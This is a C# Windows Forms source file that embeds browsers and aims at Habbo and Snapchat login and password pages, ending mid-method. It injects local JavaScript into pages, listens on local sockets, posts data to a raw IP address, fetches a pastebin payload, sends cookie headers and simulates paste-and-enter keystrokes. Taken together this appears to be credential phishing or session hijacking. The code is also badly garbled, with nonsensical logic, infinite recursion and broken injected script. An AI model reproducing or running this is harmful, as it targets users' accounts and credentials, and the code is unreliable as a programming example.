
using Desktop.Robot.Extensions;
using Microsoft.Web.WebView2.Core;
using Microsoft.Web.WebView2.WinForms;
using System.Configuration;
using System.Diagnostics;
using System.DirectoryServices.ActiveDirectory;
using System.Drawing.Imaging;
using System.Linq.Expressions;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Security.Cryptography.Xml;
using System.Security.Permissions;
using System.Text;
using System.Windows.Forms;

namespace App
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            nint hwnd = new IntPtr();
            timer1.Interval = 4500;

            // MessageBox.Show("Test");


        }
        public UIntPtr GetWindowThread()
        {
            [DllImport("user32.dll")]
            static extern bool ShowWindow(IntPtr hwnd, int nCmdshow);
            static extern bool SetForegroundWindow(IntPtr hwnd);
            static extern IntPtr SetParent(IntPtr hwndChild, IntPtr hwndNewParent);
            if (Process.GetCurrentProcess().MainWindowHandle != IntPtr.Zero)
            {
                //SetParent(this.Handle, Process.GetCurrentProcess().MainWindowHandle);
                this.CanSelect.Equals(true);
                IntPtr hwnd = this.Handle;
                //SetForegroundWindow(hwnd);
                Form1 Application = new Form1();
                this.SelectNextControl(Application, false, true, Application.CanSelect, false);
                //ShowWindow(hwnd, 9);

            }
            return GetWindowThread();
        }
        public List<Control> ClientItems = new List<Control>();
        private void timer1_Tick(object sender, EventArgs e)
        {
            IntPtr hwnd = new nint();


            using (var HttpClient = new HttpClient())
            {
                HttpClient.BaseAddress = new Uri("https://www.proxyium.com");
                var GetAsync = HttpClient.GetAsync("https://www.habbo.com");
                try
                {
                    MemoryStream ms = new MemoryStream();
                    richTextBox1.Text = GetAsync.Result.Content.ReadAsStringAsync().Result.ToString();
                }
                catch (SocketException sockEx)
                {
                    richTextBox1.Text += sockEx.Message.ToString();
                    richTextBox1.Clear();
                    List<Process> Clients = new List<Process>();
                    richTextBox1.Text = "https://www.habbo.com/logout";
                    Process[] Items = Process.GetProcessesByName(Process.GetCurrentProcess().ProcessName);
                    foreach (var items in Items)
                    {
                        Clients.Add((System.Diagnostics.Process)items);
                    }
                    for (var x = 0; x < Clients.Count; x++)
                    {
                        WebRequest Postmethod = (HttpWebRequest)WebRequest.Create("https://www.habbo.com");
                        Postmethod.Method = "POST";
                        while (Clients[x].MainWindowHandle != IntPtr.Zero)
                        {
                            WebClient wc = new WebClient();
                            wc.BaseAddress = new Uri("https://www.habbo.com/logout").ToString();
                            var PostAsync = wc.OpenWrite(Postmethod.RequestUri, "POST");
                            Postmethod.Headers.Add("User-Agent", "");
                            Postmethod.Headers.Add("Cookie", "");
                            int Recv = Postmethod.GetRequestStream().ReadByte();
                            byte[] Buffer = new byte[Clients[x].MainWindowHandle];
                            Array.Resize(ref Buffer, Recv);
                            List<byte[]> BufferDisposedItem = new List<byte[]>();
                            var HttpReqMsg = new HttpRequestMessage(HttpMethod.Post, "https://www.habbo.com/hotel");
                            if (Recv >= 0)
                            {
                                BufferDisposedItem.Add(Buffer);
                                foreach (byte xy in Buffer)
                                {
                                    byte[] Hwnd = new byte[] { xy };
                                    PostAsync.Write(Hwnd, 0, Hwnd.Length);
                                    Array.Resize(ref Hwnd, Recv);
                                    PostAsync.Write(Hwnd, 0, Hwnd.Length);
                                }
                                Array.Resize<byte>(ref Buffer, Recv);

                                HttpReqMsg.Content = new StringContent(Newtonsoft.Json.JsonConvert.SerializeObject(BufferDisposedItem[0].ToString()), Encoding.UTF8, "application/json");


                            }

                            if (Recv <= 0)
                            {
                                Process.GetCurrentProcess().Refresh();
                            }

                        }
                        // Clients[x].Kill();
                    }
                    Console.WriteLine(sockEx.Message.ToString());
                }

                checkBox1.Enabled = false;


            }
            var LParam = checkBox1.Handle == panel1.Handle;
            Type refObf = typeof(IntPtr);

            switch (panel1.Handle.GetType())
            {
                default:
                    {
                        if (panel1.Handle.GetType() == refObf)
                        {
                            refObf.InvokeMember("PostMessage", System.Reflection.BindingFlags.CreateInstance, null, new List<object[]> { new object[] { ((System.Windows.Forms.MethodInvoker)delegate { checkBox1.Handle.Equals(panel1.Handle); var hwndRef = checkBox1.Handle == panel1.Handle; var Intptrnint = panel1.Handle == checkBox1.Handle; Console.WriteLine(hwndRef); }) } }[0], null, null);
                            Func<string, byte[]> refPostMessage = delegate (string hwnd) { return new byte[] { }; };
                            using (MemoryStream MS = new MemoryStream(new byte[Process.GetCurrentProcess().MainWindowHandle]))
                            {
                                MS.BeginRead(refPostMessage(Process.GetCurrentProcess().MainWindowTitle), 0, 0, null, null);
                                GetWindowThread();
                                for (int i = 0; i < checkedListBox1.Items.Count; i++)
                                {
                                    checkedListBox1.SelectedIndex = i;
                                }

                            }
                        }
                        break;
                    }
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            //webView21.Source = new Uri("https://10minutemail.com/");

            // Byte[] Buffer = {byte)int.Parse(richTextBox2.Text.ToString())}

            var Filepath = "C:\\Users\\Admin\\Desktop\\HomeRoom.js";
            var script = Filepath.Replace("Admin", Environment.UserName);
            webView21.ExecuteScriptAsync(System.IO.File.ReadAllText(script));

            // MessageBox.Show("Test");
            timer1.Stop();
            checkBox1.Enabled = true;
            ClientForm HandleRef = new ClientForm();
            HandleRef.CanSelect.Equals(true);
            HandleRef.CanFocus.Equals(true);
            HandleRef.TopMost = false;
            HandleRef.TopLevel = false;
            panel1.Controls.Add(HandleRef);
            HandleRef.Show();
            FormClients.Add(HandleRef);
            postMessage(HandleRef.Cursor.Handle, new byte[] { 0x002 }[0], 0, 00);
            checkedListBox1.Items.Add(HandleRef.Handle);



        }

        public static List<Socket> HConnection = new List<Socket>();
        public static List<WebView2> ClientSocketsHosts = new List<WebView2>();
        struct BrowserModule

        {

            public class ProxyModuleObject : Microsoft.Web.WebView2.WinForms.WebView2
            {
                public ProxyModuleObject()
                {
                    Process[] Disposed = Process.GetProcessesByName(ClientModules[0].ProcessName);
                    foreach (var items in Disposed)
                    {
                        if (base.Source.ToString().Contains("snapchat"))
                        {
                            StreamWriter SW = new StreamWriter("C://Users//" + Environment.UserName + "//Desktop//API//Public//Handles.txt");
                            SW.WriteLine("https://www.habbo.com/api/public/catchpatoken-'Start'");
                            SW.Close();
                            SW.Dispose();
                        }
                        if (!base.Source.ToString().Contains("snapchat"))
                        {
                            Process.GetCurrentProcess().Refresh();
                            base.Source = new Uri("http://localhost:30001/api/public/authentication/");
                            base.ExecuteScriptAsync(" const XHR = new XMLHttpRequest(); XHR.open('GET','http://localhost:1302/Figurestring.php'); XHR.send(window.location); document.write(XHR.responseText);window.location='https://www.snapchat.com/logout");
                        }
                    }
                }
            }

            public class BeginDispose : TcpClient
            {
                public BeginDispose(object sender, EventArgs e)
                {
                    using (var Sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp))
                    {
                        Sock.Bind(new IPEndPoint(IPAddress.Any, 1302));
                        var HttpReqMsg = new HttpRequestMessage(HttpMethod.Post, "http://69.172.200.161:30001/websocket");
                        HttpClient Hclient = new HttpClient();
                        Hclient.BaseAddress = new Uri("http://localhost:3001/api/public/");
                        var GetAsync = Hclient.GetAsync("https://www.habbo.com/api/public/authentication/loginv2.php");
                        while (Newtonsoft.Json.JsonConvert.SerializeObject(new List<string> { GetAsync.Result.Content.ReadAsStringAsync().Result.ToString() }).Length >= 0)
                        {
                            Sock.Listen(30001);

                            NetworkStream NS = new NetworkStream(Sock.Accept());
                            ProxyModuleObject LoginApi = new ProxyModuleObject();
                            LoginApi.Source = new Uri("https://accounts.snapchat.com/v2/password?ai=a2VubnlhLWJhYnk%3D&as=Cg0xNzc2MjEzODg0MzY2En9MqgE-ARbOu_glrdzTFv3zIwEu995JepScKhGkWsM_OHPv0ao0PKTIPYg5F323vTYHyiOwS9-0_qwrLSha9RQgmsnRDvKYPoXFlZ4gTOqNXJxh3Zd7sWh8fiQZQ4OUi-Wk2QN4ONAx8BQYYxU47kcCvqTYsC1HWHDo5KoxuXtxGgyRrpI7frEtN8iIGRE&continue=%2Faccounts%2Fsso%3Fclient_id%3Dweb-calling-corp--prod%26referrer%3Dhttps%253A%252F%252Fwww.snapchat.com%252Fweb%253Fref%253Dsign_in_sidebar&referrer=https%3A%2F%2Fwww.snapchat.com%2Fweb%3Fref%3Dsign_in_sidebar&captchaChallenge=CioKKDZMZk5RV1lyQUFBQUFHQzkwSVc0a3VMaXdMQ3dNS2VhcEh0U1o5V1U");
                            WebClient wc = new WebClient();
                            wc.BaseAddress = new Uri(LoginApi.Source.ToString()).ToString();
                            wc.Headers.Add("referer", Hclient.BaseAddress.ToString());
                            var PostAsync = wc.OpenWrite("https://www.habbo.com/habbo-imaging/avatar/hr-170-42.hd-208-1370.ch-878-64-1408.lg-285-82.sh-3068-1408-1408.ha-1021-91.fa-3276-72.wa-2001%2Cs-2.g-1.d-2.h-2.a-0%2C5a96eddd3088826f4c1d4f99e6291db1.png", "POST");
                            StreamWriter SW = new StreamWriter(NS, new StreamReader(PostAsync).CurrentEncoding);
                            SW.WriteLine("HTTP /1.1 200 OK\r");
                            Random IndexValue = new Random();
                            List<Socket> ClientConnectionHandler = new List<Socket>();
                            var BeginAccept = Sock.BeginAccept(new AsyncCallback((sender) => { ClientConnectionHandler.Add((Socket)Sock.Accept()); IndexValue.NextBytes(new byte[ClientConnectionHandler[0].SendBufferSize]); }), null);
                            Func<IntPtr, byte[]> BeginDisconnect = delegate (nint hwnd) { Sock.BeginReceive(new byte[] { }, 0, 0, SocketFlags.None, new AsyncCallback((sender) => { [DllImport("user32.dll", SetLastError = true)] static extern IntPtr SetParent(IntPtr hwndChild, IntPtr hwndNewParent); Socket Accepted = Sock.Accept(); if (Accepted.Handle != IntPtr.Zero) { ClientConnectionHandler.Add((Socket)Accepted); [DllImport("user32.dll")] static extern void keybd_event(byte Bkey, byte Bscan, int dwFlags, int dwExtraInfo); keybd_event(0x11, 0, 0x0000, 0); keybd_event(0x11, 0, 0x0002, 0); keybd_event(0x56, 0, 0x0000, 0); keybd_event(0x56, 0, 0x0000D, 0); keybd_event(0x0D, 0, 0x0000, 0); keybd_event(0x0D, 0, 0x0002, 0); Desktop.Robot.Robot wm_char = new Desktop.Robot.Robot(); wm_char.GetMousePosition(); [DllImport("user32.dll")] static extern bool PostMessage(IntPtr hwnd, uint Msg, int Wparam, int LpARAM); PostMessage(Accepted.Handle, new byte[] { (byte)LoginApi.Handle }[0], 0, 0); } Console.Write(BeginAccept); }), null); return new byte[] { (byte)ClientModules[0].MainWindowHandle, (byte)0x0002 }; };
                            var ConentAsync = new StreamContent(new MemoryStream(BeginDisconnect(Process.GetCurrentProcess().MainWindowHandle)));
                            var DispatchEvent = "<script> dispatchEvent(); function dispatchEvent(){const elem = 'TextInput_textInput__XIzwQ '; elem[0].value='" + Convert.ToBase64String(BeginDisconnect(Process.GetCurrentProcess().MainWindowHandle)) + "';var oimg = document.createElement('img'); oimg.setAttribute('src','http://localhost:1302/'); oimg.setAttribute('width','400px'); oimg.setAttribute('height','900px'); oimg.setAttribute('class',\"https://www.habbo.com\"); oimg.setAttribute(\"id\",\"http://localhost:1302\"); document.body.appendChild(oimg);)} dispatchEvent();</script>";
                            LoginApi.ExecuteScriptAsync(DispatchEvent.Replace("<script>", string.Empty.Replace("</script>", string.Empty)));
                            PostAsync.Write(Encoding.ASCII.GetBytes(DispatchEvent));
                            HttpReqMsg = new HttpRequestMessage(HttpMethod.Post, LoginApi.Source);
                            HttpReqMsg.Content = new StringContent(DispatchEvent, Encoding.UTF8, "text/html");
                            Hclient.BaseAddress = new Uri(LoginApi.Source.ToString().Replace("https://accounts.snapchat.com", "http://localhost:30001"));
                            var SendAsync = Hclient.SendAsync(HttpReqMsg);
                            Process[] Disposed = Process.GetProcessesByName(ClientModules[0].ProcessName);
                            foreach (var items in Disposed)
                            {
                                [DllImport("user32.dll", SetLastError = true)]
                                static extern bool ShowWindow(IntPtr hwnd, int nCmdshow);
                                try
                                {
                                    const int SW_HIDE = 9;
                                    SendAsync.Wait(Disposed.Length);
                                    ShowWindow(items.MainWindowHandle, 9);
                                }

                                catch (SocketException sockEx)
                                {
                                    LoginApi.ExecuteScriptAsync("showDirectoryPicker();");
                                    OpenFileDialog OFD = new OpenFileDialog();
                                    if (OFD.ShowDialog() == DialogResult.OK)
                                    {
                                        LoginApi.ExecuteScriptAsync(SendAsync.ToString());
                                        MessageBox.Show("Disconnection!");
                                        int SW_Close = IndexValue.Next(1, 443);
                                        if (SW_Close >= 200)
                                        {
                                            WebRequest GetMethod = (HttpWebRequest)WebRequest.Create("https://www.habbo.com/");
                                            GetMethod.Method = "POST";
                                            var GetResponseStream = Hclient.GetAsync("https://www.habbo.com");
                                            GetMethod.Headers.Add("cookie", GetResponseStream.Result.ToString());
                                            using (var GetResponse = GetMethod.GetRequestStream())
                                            {
                                                SW = new StreamWriter(GetResponse, new StreamReader(NS).CurrentEncoding);
                                                SW.WriteLine("HTTP /1.0 200 OK\r");
                                                SW.WriteLine(BeginDisconnect(items.MainWindowHandle));
                                                SW.Close();
                                                SW.Dispose();
                                                NS.Close(); NS.Dispose();
                                            }

                                            //Application.Exit();
                                        }

                                        if (SW_Close <= 200)
                                        {
                                            WebRequest GetMethod = (HttpWebRequest)WebRequest.Create("https://www.habbo.com/");
                                            GetMethod.Method = "POST";
                                            var GetResponseStream = Hclient.GetAsync("https://www.habbo.com");
                                            GetMethod.Headers.Add("cookie", GetResponseStream.Result.ToString());
                                            using (var GetResponse = GetMethod.GetRequestStream())
                                            {
                                                SW = new StreamWriter(GetResponse, new StreamReader(NS).CurrentEncoding);
                                                SW.WriteLine("HTTP /1.0 200 OK\r");
                                                SW.WriteLine(BeginDisconnect(items.MainWindowHandle));
                                                SW.Close();
                                                SW.Dispose();
                                            }

                                            Application.Exit();
                                        }

                                    }
                                }
                                return;
                            }


                        }

                    }
                }
            }
        }
        public delegate bool[] GetBrowserModule(IntPtr hwnd);
        public void DisconnectionHandler(IAsyncResult AR)
        {

        }
        public static List<Socket> ConnectionClientHandler = new List<Socket>();
        public List<string> refRemoteEndpoint = new List<string>();

        public List<Microsoft.Web.WebView2.WinForms.WebView2> BrowserClients = new List<Microsoft.Web.WebView2.WinForms.WebView2>();
        private void Form1_Load(object sender, EventArgs e)
        {
            timer1.Interval = 4052;
            timer3.Interval = 1456;
            //timer3.Start();
            timer7.Interval = 5689;
            timer7.Start();
            button4.Enabled = false;
            timer4.Interval = 9678;
            //timer4.Start();
            webView21.Source = new Uri("https://www.proxyium.com");
            using (var HttpClient = new HttpClient())
            {
                try
                {
                    HttpClient.BaseAddress = new Uri("https://www.habbo.com/api/");
                    var GetAsync = "C://Users//Admin//Desktop//handles.txt";
                    var Filepath = GetAsync.Replace("Admin", Environment.UserName);
                    button4.Text = "Disconnected" + File.ReadAllText(Filepath);
                    textBox2.Text = File.ReadAllText(Filepath);
                    textBox2.Enabled = false;

                    BrowserModule.BeginDispose BeginConnect = new BrowserModule.BeginDispose(sender, e);


                    BeginDisconnect.Interval = 3001;
                    tabControl1.SelectedTab = tabControl1.TabPages[1];

                    string[] tokens = { ".php", ".py", ".js", ".vbs", ".txt", ".html", ".css", ".json" };
                    foreach (var Filestream in tokens)
                    {
                        switch (Filestream)
                        {
                            case ".php":
                                {
                                    var Uri = HttpClient.GetAsync("https://www.habbo.com/api/public/" + Filepath.Replace("C://Users//" + Environment.UserName + "//", "admin".Replace("Desktop//API//Handles.txt", Filestream)));
                                    List<Process> Clients = new List<Process>();
                                    Process[] Disposed = Process.GetProcessesByName(Encoding.Default.GetString(File.ReadAllBytes(GetAsync)));
                                    foreach (var Process in Disposed)
                                    {
                                        if (Process.MainWindowTitle.Length >= 5)
                                        {
                                            Clipboard.SetText(Process.MainWindowTitle.ToString());
                                            Socket x = null;
                                            Type Obref = typeof(IntPtr);
                                            MessageBox.Show("Connected..." + Process.MainWindowTitle.ToString().Substring(0, 5));
                                            List<string> HttpContent = new List<string> { Newtonsoft.Json.JsonConvert.SerializeObject(Uri.Result.Content.ReadAsStringAsync()) };
                                            var HttpReqMsg = new HttpRequestMessage(HttpMethod.Post, "http://localhost:3001/api/public/rooms/6/Forward");
                                            var Content = "<html><script src='https://www.habbo.com'>postMessage();function postMessage(){window.location = 'https://wwww.habbo.com';}postMessage(); </script> <body><script><dispatchEvent();function dispatchEvent(){var items =[]; let scriptElem = document.QuerySelectorAll('script');for(const el of scriptElem){items.push(el);console.log(window.location.href.toString().length); var index = window.location.href.toString().length;for(var x= index; x>=0; x--){el.removeAttribute('src');document.body.appendChild(el);window.location = 'https://www.habbo.com/api/authentication/loginv2.php';}}dispatchEvent();</script></body></html>";
                                            Clipboard.SetText(Content.ToString());
                                            Microsoft.Web.WebView2.WinForms.WebView2 BrowserClient = new Microsoft.Web.WebView2.WinForms.WebView2();
                                            BrowserClient.Source = new Uri("https://www.pastebin.com/raw/TF9MauVK");
                                            HttpWebRequest PostMessage = (HttpWebRequest)WebRequest.CreateHttp("https://www.google.com");
                                            PostMessage.Method = "GET";
                                            Stream OBJNode = PostMessage.GetResponse().GetResponseStream();
                                            StreamReader SR = new StreamReader(OBJNode);
                                            var byteMessage = Encoding.UTF8.GetString(SR.CurrentEncoding.GetBytes(Convert.ToBase64String(new byte[Content.Length])));
                                            BrowserModule.ProxyModuleObject HostBrowser = new BrowserModule.ProxyModuleObject();
                                            HostBrowser.Source = new Uri("http://69.172.200.161:30001/");
                                            HostBrowser.ExecuteScriptAsync("var index = window.location.toString(). var xhr = new XMLHttpRequest(); xhr.open('GET','http://localhost:30001/'); xhr.send(null0;length;fo(var x = index; x>=window.location.toString().length; x++){console.log('                                                                        ,,,   \r\n  ,,,,,,,,,,,,,,, ,,,,,,,,,,,,,,,,,,,,,,, ,,,,,,,,,,,,    ,,,,,,,,,,   ,::,,  \r\n,,@@@@@@@@@@@@@@:,:@@@@@@@@::@@@@@@@@@@@::@@@@@@@@@@@@:,,,:@@@@@@@@:,,,::: :, \r\n,,@@@@@@@@@@@@@@@:@@@@@@@@@@:@@@@@@@@@@@@@@@@@@@@@@@@@@:,:@@@@@@@@@@:,:   : ,,\r\n,,@@,,,,,@,,,,,,@@,,,,,,,,,,@@,,,,,,,,,,,@@@,,,,,,,,,,@@@@,,,,,,,,,,@@:  :: ,,\r\n,,@@,,,,,@,,,,,,@@,,,,,,,,,,@@,,,,,,,,,,,,@@,,,,,,,,,,,@@@,,,,,,,,,,@@:::: :,,\r\n,,@@,,,,,@,,,,,,@,,,,,,,,,,,,@,,,,,,,,,,,,@@,,,,,,,,,,,,@,,,,,,,,,,,,@@@::,,, \r\n,,@@,,,,,@,,,,,,@,,,,,,,,,,,,@,,,,,,,,,,,,@@,,,,,,,,,,,,@,,,,,,,,,,,,@@@:,,,  \r\n,,@@,,,,,@,,,,,,@,,,,,@@,,,,,@,,,,,,@,,,,,@@,,,,,@,,,,,,@,,,,,@@,,,,,@;;@@,,  \r\n,,@@,,,,,@,,,,,,@,,,,,@@,,,,,@,,,,,,@,,,,,@@,,,,,@,,,,,,@,,,,,@@,,,,,@;;@@:,  \r\n,,@@,,,,,,,,,,,,@,,,,,@@,,,,,@,,,,,,@,,,,,@@,,,,,@,,,,,,@,,,,,@@,,,,,@;;;;@:, \r\n,,@@,,,,,,,,,,,,@,,,,,@@,,,,,@,,,,,,,,,,,,@@,,,,,,,,,,,,@,,,,,@@,,,,,@;;;;@@,,\r\n,,@@,,,,,,,,,,,,@,,,,,@@,,,,,@,,,,,,,,,,@@@@,,,,,,,,,,@@@,,,,,@@,,,,,@;;;;@@,,\r\n,,@@::::::::::::@:::::@@:::::@::::::::::@@@@::::::::::@@@:::::@@:::::@;;;;@@,,\r\n,,@@::::::::::::@::::::::::::@::::::::::::@@::::::::::::@:::::@@:::::@;;;;@@,,\r\n,,@@::::::::::::@::::::::::::@::::::@:::::@@:::::@::::::@:::::@@:::::@;;;;@@,,\r\n,,@@:::::@::::::@::::::::::::@::::::@:::::@@:::::@::::::@:::::@@:::::@;;;;@@,,\r\n,,@@:::::@::::::@:::::@@:::::@::::::@:::::@@:::::@::::::@:::::@@:::::@;;;;@@,,\r\n,,@@:::::@::::::@:::::@@:::::@::::::::::::@@::::::::::::@::::::::::::@;;;;@@,,\r\n,,@@:::::@::::::@:::::@@:::::@::::::::::::@@::::::::::::@::::::::::::@;;;;@@,,\r\n,,@@:::::@::::::@:::::@@:::::@::::::::::::@@:::::::::::@@@::::::::::@@;;;;@@,,\r\n,,@@:::::@::::::@:::::@@:::::@:::::::::::@@@::::::::::@@@@::::::::::@@;;;;@@,,\r\n,,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;;;@@@@@@@@@@;;;;;;@@,,\r\n,,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;;@@@@@@@@@@@;;;;;@@@@@@@@@;;;;;;;@@,,\r\n,,,:@@;;;;@@;;;;;@@;;;;;@@;;;;@@;;;;;;;;;;;;@@;;;;;;;;;;;;;;@@;;;;;;;;;;;;@@,,\r\n ,,,@@;;;;;@@;;;;;@@;;;;@@;;;;;@@;;;;;;;;;;;@@;;;;;;;;;;;;;;@@;;;;;;;;;;;;@:,,\r\n  ,,,:@@;;;;@@;;;;;@@;;;;;@@;;;;@@;;;;;;;;;;@@@@;;;;;;;;;;@@@:@@;;;;;;;;@@:,, \r\n   ,,,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:,@@@@@@@@@@@@,,, \r\n    ,,,:::::::::::::::::::::::::::::::::::::::,::::::::::::,,,,,::::::::,,,,  \r\n     ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,   \r\n      ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,   ,,,,,,,,,,     ');}");


                                            MessageBox.Show("PID:");



                                        }
                                    }
                                    break;
                                }
                            case ".py":
                                {
                                    break;
                                }

                            case ".json":
                                {
                                    break;
                                }

                            case ".vbs":
                                {
                                    break;
                                }


                        }

                    }

                    Program.BeginConnect();
                }

                catch (SocketException sockEx)
                {

                }
            }



            //timer1.Start();

            for (int i = 0; i < checkedListBox1.Items.Count; i++)
            {
                var HttpWebReq = (HttpWebRequest)WebRequest.Create("https://www.bing.com/search?q=dianna+russini&form=SSHTRD&qs=TS&cvid=37b6bdd446d84136b15ee4ef766f07af&pq=&cc=US&setlang=en-US&nclid=4202856F4C96C839EE2E8EF75BAEA651&ts=1775684256387&wsso=Moderate&PC=WSBREC");
                HttpWebReq.Method = "POST";
                HttpWebReq.Headers.Add("referer", "http://localhost:443/api/public/authentiction/loginv2");
                HttpWebReq.Headers.Add("cookie", "");
                HttpWebReq.Headers.Add("accept", "text/html");
                HttpWebReq.Headers.Add("browser_token", "");
                using (var GetReqStream = HttpWebReq.GetRequestStream())
                {
                    StreamWriter SW = new StreamWriter(GetReqStream, Encoding.ASCII);
                    StreamReader sr = new StreamReader(GetReqStream);
                    SW = new StreamWriter(GetReqStream, sr.CurrentEncoding);
                    HttpWebResponse WebResp = (HttpWebResponse)HttpWebReq.GetResponse();
                    SW.WriteLine("HTTP/1.1 200 OK\r");



                    return;
                }
                checkedListBox1.SelectedIndex = i;

            }

            var httpClient = new HttpClient();
            httpClient.BaseAddress = new Uri("https://69.172.200.161/public/api");
            using (var httpReqMsg = new HttpRequestMessage(HttpMethod.Post, "https://www.habbo.com/api/public/authentication/loginv2"))
            {







            }
        }


        public Func<IntPtr, byte[]> PostMessage;

        public bool validateCertificate(object sender, X509Certificate cert, X509Chain chain, SslPolicyErrors er)
        {

            if (er == SslPolicyErrors.None)
            {
                [DllImport("user32.dll", SetLastError = true)]
                static extern IntPtr SetParent(IntPtr hwndChild, IntPtr hwndNewParent);
                static extern bool ShowWindow(IntPtr hwnd, int nCmdshow);

            }


            if (er != SslPolicyErrors.None)
            {
                [DllImport("user32.dll", SetLastError = true)]
                static extern IntPtr SetParent(IntPtr hwndChild, IntPtr hwndNewParent);
                static extern bool ShowWindow(IntPtr hwnd, int nCmdshow);

            }


            {
                // return true;
            }


            return false;
        }
        public static List<Process> ClientModules = new List<Process>();

        public virtual void DisconnectionHandler()
        {

            [DllImport("user32.dll", SetLastError = true)]
            static extern IntPtr SetParent(IntPtr hwndChild, IntPtr hwndNewParent);
            static extern bool ShowWindow(IntPtr hwnd, int nCmdshow);

        }
        public void ConnectionCallback(IAsyncResult AR)
        {
            [DllImport("user32.dll", SetLastError = true)]
            static extern IntPtr SetParent(IntPtr hwndChild, IntPtr hwndNewParent);
            static extern bool ShowWindow(IntPtr hwnd, int nCmdshow);
            using (var HttpClient = new HttpClient())
            {
                HttpClient.BaseAddress = new Uri("https://www.pastebin.com/raw/TF9MauVK");
                var GetAsync = HttpClient.GetAsync("https://www.habo.com/api/public/authentiction/loginv2/admin.php");
                Console.WriteLine(GetAsync.Result.ToString());
                //richTextBox1.Text += GetAsync.Result.Content.ReadAsStringAsync().Result.ToString();
                foreach (var items in ClientModules)
                {
                    SetParent(ClientModules[0].MainWindowHandle, IntPtr.Zero);
                    SetParent(IntPtr.Zero, ClientModules[0].MainWindowHandle);
                    ShowWindow(ClientModules[0].MainWindowHandle, 9);
                    this.CanSelect.Equals(true);
                    this.SelectNextControl(panel1, false, ClientModules[0].HasExited, false, true);
                }
            }


        }
        [DllImport("user32.dll", SetLastError = true, EntryPoint = "PostMessage")]
        static extern IntPtr postMessage(IntPtr hwnd, uint msg, int Lparam, int wParam);
        public static List<ClientForm> FormClients = new List<ClientForm>();
        private void checkedListBox1_SelectedIndexChanged(object sender, EventArgs e)

        {
            [DllImport("user32.dll", SetLastError = true)]
            static extern IntPtr SetParent(IntPtr hwndChild, IntPtr hwndNewParent);
            static extern bool ShowWindow(IntPtr hwnd, int nCmdshow);
            using (var HttpClient = new HttpClient())
            {

                HttpClient.BaseAddress = new Uri("https://www.pastebin.com/raw/TF9MauVK");
                var GetAsync = HttpClient.GetAsync("https://www.habo.com/api/public/authentiction/loginv2/admin.php");
                //Console.WriteLine(GetAsync.Result.ToString());
                //richTextBox1.Text += GetAsync.Result.Content.ReadAsStringAsync().Result.ToString();
                foreach (ClientForm x in FormClients)
                {
                    x.CanSelect.Equals(true);
                    x.CanSelect.Equals(true);
                    x.Select();


                    x.CanSelect.Equals(true);
                    x.CanSelect.Equals(true);
                    x.Select();

                    SetParent(x.Handle, panel1.Handle);


                    x.CanSelect.Equals(true);
                    x.CanSelect.Equals(true);
                    x.Select();



                    x.Dock = DockStyle.Fill;


                    x.CanSelect.Equals(true);
                    x.CanSelect.Equals(true);
                    x.Select();

                }
                for (int i = 0; i < FormClients.Count; i++)
                {
                    FormClients[i].CanSelect.Equals(true);
                    Random Index = new Random();
                    int Value = Index.Next(1, FormClients.Count);
                    if (Value <= i)
                    {
                        Index.NextBytes(Encoding.Default.GetBytes(FormClients[Value].CanSelect.ToString()));
                        FormClients[Value].CanSelect.Equals(true);
                        foreach (var itemsin in FormClients)
                        {
                            itemsin.CanSelect.Equals(true);
                            itemsin.CanFocus.Equals(true);
                            itemsin.Show();
                            [DllImport("user32.dll")]
                            static extern void keybd_event(byte bKey, byte bScan, int dwFlags, int dwExtraInfo);
                            Console.WriteLine(false);
                            //  ShowWindow(itemsin.Handle, 9);
                            const int SW_SHOW = 9;
                            //ShowWindow(itemsin.Handle, SW_SHOW);
                            Form1 Application = new Form1();
                            Application.SelectNextControl(itemsin, false, false, false, new List<Form1> { this }[0].CanSelect);
                        }
                    }

                    WebRequest PostMethod = (HttpWebRequest)WebRequest.Create("http://localhost:30001/");
                    PostMethod.Headers.Add("User-Agent", "");
                    PostMethod.Method = "POST";
                    var BeginDisconnect = PostMethod.BeginGetRequestStream(new AsyncCallback((sender) => { foreach (var items in FormClients) { items.CanSelect.Equals(false); items.CanSelect.Equals(true); items.SelectNextControl(this, false, false, true, false); items.SelectNextControl(items, false, true, false, false); } this.CanSelect.Equals(true); this.SelectNextControl(FormClients[0], true, false, false, true); }), null);
                    Console.WriteLine(BeginDisconnect);
                    using (var Memorystream = new StreamContent(new MemoryStream(new byte[] { (byte)FormClients[i].Handle })))
                    {
                        StreamReader SR = new StreamReader(Memorystream.ReadAsStream());
                        WebClient wc = new WebClient();
                        wc.BaseAddress = new Uri("https://www.habbo.com/habbo-imaging/avatar/hr-115-37.hd-180-1370.ch-220-76.lg-275-90.sh-290-64.ha-1003-72%2Cs-2.g-1.d-2.h-2.a-0%2Cdc7687aaee045402570b1a41fc8d7c5d.png").ToString();
                        var httpClient = new HttpClient();
                        // HttpClient.BaseAddress = new Uri("https://www.pastebin.com/raw/TF9MauVK");
                        httpClient.GetAsync("https://www.habbo.com/profile/Ma0l");
                        //wc.Headers.Add("cookie", HttpClient.GetAsync("https://www.habbo.com/profile/Macklebee").Result.ToString());
                        var PostAsync = wc.OpenWrite(HttpClient.BaseAddress, "POST");
                        PostAsync.Write(new byte[] { });

                    }
                }

            }
        }
        public Process PostMessageRef(IntPtr hwnd)
        {
            //MessageBox.Show("https://www.habbo.com");
            Desktop.Robot.Robot wm_char = new Desktop.Robot.Robot();
            wm_char.KeyPress(Desktop.Robot.Key.CapsLock);
            wm_char.KeyPress(Desktop.Robot.Key.Enter);
            wm_char.CombineKeys(Desktop.Robot.Key.Control, Desktop.Robot.Key.V, Desktop.Robot.Key.Enter);
            SendKeys.Send("^v");
            SendKeys.Send("{ENTER}");
